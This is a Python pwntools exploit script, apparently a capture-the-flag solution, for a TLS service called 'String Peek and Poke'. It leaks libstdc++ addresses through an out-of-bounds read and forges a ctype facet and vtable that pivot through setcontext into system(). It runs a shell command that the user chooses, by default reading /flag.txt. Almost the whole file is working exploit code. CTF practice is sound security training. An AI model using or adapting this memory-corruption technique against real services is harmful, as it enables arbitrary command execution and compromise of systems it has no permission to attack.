#!/usr/bin/env python3
"""Exploit String Peek and Poke over the organizer's TLS service."""

import argparse
import re
import struct
import sys
import time

from pwn import context, remote


SHORT_LEAK_INDEX = -67825
SHORT_LEAK_SIZE = 0x70
LIBSTDCXX_POINTER_OFFSETS = {
    0x00: 0xD2DB0,
    0x08: 0xD2E30,
    0x28: 0xD2DA0,
    0x30: 0xD2DF0,
}
BLOCKED = {0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x20}
COMMAND_OFFSET = 0x428


def read_until_quiet(tube, *, quiet=5.0, limit=4_000_000, total_timeout=120):
    """Read raw binary output until the socket is quiet or closes."""
    data = bytearray()
    started = last_data = time.monotonic()
    while len(data) < limit and time.monotonic() - started < total_timeout:
        try:
            chunk = tube.recv(65536, timeout=quiet)
        except EOFError:
            break
        if chunk:
            data.extend(chunk)
            last_data = time.monotonic()
            continue
        if time.monotonic() - last_data >= quiet:
            break
    return bytes(data)


def recover_libstdcxx(disclosure):
    candidates = []
    for pos, module_offset in LIBSTDCXX_POINTER_OFFSETS.items():
        if pos + 8 > len(disclosure):
            continue
        value = struct.unpack_from("<Q", disclosure, pos)[0]
        base = value - module_offset
        if 0 < base < (1 << 47) and base & 0xFFF == 0:
            candidates.append((base, pos, module_offset))
    counts = {}
    for base, _, _ in candidates:
        counts[base] = counts.get(base, 0) + 1
    if not counts:
        raise RuntimeError("no libstdc++ base candidates in short disclosure")
    base, matches = max(counts.items(), key=lambda item: item[1])
    if matches < 4:
        raise RuntimeError(f"libstdc++ base candidates did not agree ({candidates!r})")
    return base, matches


def make_payload(libstdcxx, command_text):
    # The deployed loader maps libc 0x213000 below libstdc++.
    libc = libstdcxx - 0x213000
    ctype = libstdcxx + 0x27BA20  # shared ctype<char> facet

    length = 0x520
    payload = bytearray(length)

    def put64(offset, value):
        struct.pack_into("<Q", payload, offset, value)

    fake_vptr = ctype + 0x350
    mask_table = ctype + 0x240
    setcontext = libc + 0x4A960
    system = libc + 0x58750
    exit_stub = libc + 0xEE300  # _exit
    command = ctype + COMMAND_OFFSET
    stack = ctype + 0x238

    put64(0x00, fake_vptr)
    put64(0x30, mask_table)  # ctype<char>::_M_table
    payload[0x38] = 0         # ctype<char>::_M_widen_ok

    # Fake ctype vtable entries for do_widen(char) and do_widen(range).
    put64(0x350 + 0x30, setcontext)
    put64(0x350 + 0x38, setcontext)

    # Minimal 128-entry ASCII ctype mask table. It recognizes the separator
    # space and decimal zero used by the follow-up "get 0" command.
    struct.pack_into("<H", payload, 0x240 + 2 * 0x20, 0xFFFF)
    struct.pack_into("<H", payload, 0x240 + 2 * 0x30, 0xFFFF)

    # setcontext(ucontext at ctype) -> system(command) -> _exit.
    put64(0x68, command)       # REG_RDI
    put64(0x70, 0)             # REG_RSI
    put64(0x88, 0)             # REG_RDX
    put64(0xA0, stack)         # REG_RSP; 8 mod 16 at system entry
    put64(0xA8, system)        # REG_RIP
    put64(0xE0, ctype + 0x180) # fpregs pointer for setcontext
    struct.pack_into("<H", payload, 0x180, 0x037F)  # valid x87 control word
    struct.pack_into("<I", payload, 0x1C0, 0x1F80) # default MXCSR
    put64(0x238, exit_stub)    # return address after system
    command_bytes = command_text.encode() + b"\0"
    if len(command_bytes) > len(payload) - COMMAND_OFFSET:
        raise RuntimeError("shell command is too long for its payload slot")
    payload[COMMAND_OFFSET:COMMAND_OFFSET + len(command_bytes)] = command_bytes

    bad = [(i, byte) for i, byte in enumerate(payload) if byte in BLOCKED]
    if bad:
        sample = ", ".join(f"{i:#x}:{b:#x}" for i, b in bad[:8])
        raise RuntimeError(f"payload contains token whitespace bytes: {sample}")
    return bytes(payload)


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("host", help="instance hostname")
    parser.add_argument("port", type=int, help="instance TCP port")
    parser.add_argument("--debug", action="store_true")
    parser.add_argument("--command", default="cat</flag.txt", help="whitespace-free shell command")
    args = parser.parse_args()

    context.log_level = "error"
    context.timeout = 5
    io = remote(args.host, args.port, ssl=True)
    try:
        io.recvuntil(b"> ", timeout=10)
        io.sendline(f"get {SHORT_LEAK_INDEX}".encode())
        disclosure = io.recvn(SHORT_LEAK_SIZE, timeout=20)
        libstdcxx, matches = recover_libstdcxx(disclosure)
        prompt = io.recvuntil(b"> ", timeout=10)
        if not prompt.endswith(b"> "):
            raise RuntimeError(f"short leak did not return to command prompt: {prompt!r}")
        payload = make_payload(libstdcxx, args.command)
        if args.debug:
            print(
                f"short_disclosure={len(disclosure):#x} libstdc++={libstdcxx:#x} "
                f"libc={libstdcxx - 0x213000:#x} matches={matches} "
                f"payload={len(payload):#x}",
                file=sys.stderr,
            )

        io.send(b"put -1 " + payload + b"\nget 0\n")
        output = read_until_quiet(io, quiet=5.0, limit=1_000_000, total_timeout=60)
        flag = re.search(rb"FortID\{[^}\r\n]+\}", output)
        if not flag:
            raise RuntimeError(f"flag not present in response ({len(output)} bytes): {output[:512]!r}")
        print(flag.group(0).decode())
    finally:
        io.close()


if __name__ == "__main__":
    main()
